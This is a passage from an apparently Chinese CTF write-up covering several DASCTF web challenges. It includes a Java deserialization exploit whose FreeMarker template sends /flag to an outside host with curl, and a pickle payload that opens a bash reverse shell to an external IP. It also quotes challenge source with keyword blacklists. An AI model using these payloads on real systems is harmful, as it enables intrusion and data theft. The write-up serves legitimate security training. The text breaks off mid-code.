class="built_in">this</span>.obj.get(method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果这个进行动态代理以后则代理的类方法会被拦截反过来执行HtmlInvocationHandler中成员变量obj的get方法，并且方法名作为变量传入。</p><p>发现HTMLmap类的get方法代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> HtmlUploadUtil.uploadfile(<span class="built_in">this</span>.filename, <span class="built_in">this</span>.content);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现不管key是多少，都会调用HtmlUploadUtil.uploadfile(this.filename, this.content)</p><p>然后审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">uploadfile</span><span class="params">(String filename, String content)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (filename != <span class="literal">null</span> &amp;&amp; !filename.endsWith(<span class="string">&quot;.ftl&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> <span class="string">&quot;/app/templates/&quot;</span> + filename;</span><br><span class="line">        <span class="keyword">if</span> (!realPath.contains(<span class="string">&quot;../&quot;</span>) &amp;&amp; !realPath.contains(<span class="string">&quot;..\\&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(realPath));</span><br><span class="line">                writer.write(content);</span><br><span class="line">                writer.close();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">                System.err.println(<span class="string">&quot;Error uploading file: &quot;</span> + var4.getMessage());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是上传.ftl后缀结尾的文件，ftl是java的模板类似于python 的jinja2模板。是可以执行代码的，加上可以上传ftl文件，所以可以考虑上传index.ftl文件覆盖原文件，达到执行恶意代码功能。</p><p>利用点找到了，剩下的就是链子。</p><p>这里可以利用动态代理去代理map，这样map调用toString的时候会调用到this.obj.get(method.getName())，从而调用文件上传。</p><p>然后map的toString方法可以由BadAttributeValueExpException反序列化的时候调用，所以链子就是BadAttributeValueExpException#readObject -&gt; Map#toString -&gt; HtmlInvocationHandler#invoke -&gt; HtmlMap#get -&gt; HtmlUploadUtil#uploadfile</p><p>然后上传内容是ssti 利用curl外带flag</p><p>生成序列化字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.HtmlMap;</span><br><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.NewObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HtmlMap</span> <span class="variable">htmlMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlMap</span>();</span><br><span class="line">        htmlMap.filename = <span class="string">&quot;index.ftl&quot;</span>;</span><br><span class="line">        htmlMap.content = <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;#assign a=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;#assign b=a.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;#assign c=b.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;#assign VOID=b.setNewBuiltinClassResolver(c)&gt;$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;curl -X POST -F flag=@/flag https://t7609j5619.goho.co\&quot;)&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;body&gt;&lt;/body&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/html&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">htmlInvocationHandlerClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.ycbjava.Utils.HtmlInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">HtmlInvocationHandlerConstructor</span> <span class="operator">=</span> htmlInvocationHandlerClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        HtmlInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expmap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                exp.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                (InvocationHandler) HtmlInvocationHandlerConstructor.newInstance(htmlMap)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置bavException的值</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bavException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> bavException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(bavException, expmap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(bavException);</span><br><span class="line">        byteArrayOutputStream.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        NewObjectInputStream objectInputStream = new NewObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span></span><br><span class="line"><span class="comment">//        objectInputStream.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230903045728113.png" alt="image-20230903045728113"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230903045756483.png" alt="image-20230903045756483"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230903045812602.png" alt="image-20230903045812602"></p><p>DASCTF{13685934647267473647078910074106}</p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>根据题目提示，拿到<a href="http://www.zip解压得到app.py/">www.zip解压得到app.py</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verification&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        attribute = session.get(<span class="string">&#x27;Attribute&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(attribute, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacker!!!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> attribute.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> attribute.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> secret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Don&#x27;t play tricks on me&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are a perfect stranger to me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>题目中没有给我们session的密钥，于是先解密一下flask-session，结果发现secret_key在里面</p><p>利用得到的，结合代码以管理员身份登录</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902230342146.png" alt="image-20230902230342146"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902230328054.png" alt="image-20230902230328054"></p><p>提示跳转/src0de拿到部分源码</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902230415768.png" alt="image-20230902230415768"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>发现是一个pickle反序列化，但是有check函数检查，不知道是什么函数。</p><p>经过测试发现操作码R被过滤了，利用b指令码调用<code>__setstate__</code> 具体原理可以见<a href="https://xz.aliyun.com/t/11807#toc-4">最近碰到的 Python pickle 反序列化小总结 - 先知社区 (aliyun.com)</a> 中bypass</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">GWHT</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/115.236.153.174/47295 0&gt;&amp;1\&quot;&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure><p>然后反弹shell</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902230956597.png" alt="image-20230902230956597"></p><p>拿到shell以后发现flag文件要root权限读取，于是这里用到了Capabilities提权，</p><p>虽然没有getcap，推测python可能存在，于是尝试用python提权，发现成功了</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902231516655.png" alt="image-20230902231516655"></p><p>最好是利用提权神器linpeas.sh，这个是最能发现利用点的。</p><p>最终拿到flag</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902231619216.png" alt="image-20230902231619216"></p><p>DASCTF{52139463825490067065822591827051}</p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>这个题是做过类似的题目，完全非预期解</p><p>首先拿到源码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>审计一遍以后发现只过滤了fl ag，然后尝试读取docker创建时候的环境变量，发现确实在环境变量中。</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230902232132437.png" alt="image-20230902232132437"></p><p>最终拿到flag DASCTF{12823372594489346656591220623656}</p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>拿到源码进行本地模拟部署</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;bytes&quot;</span>,</span><br><span class="line">        <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;map&quot;</span>,</span><br><span class="line">        <span class="string">&quot;frozenset&quot;</span>,</span><br><span class="line">        <span class="string">&quot;popen&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tuple&quot;</span>,</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;object&quot;</span>,</span><br><span class="line">        <span class="string">&quot;listitems&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">        <span class="string">&quot;object&quot;</span>,</span><br><span class="line">        <span class="string">&quot;apply&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> no <span 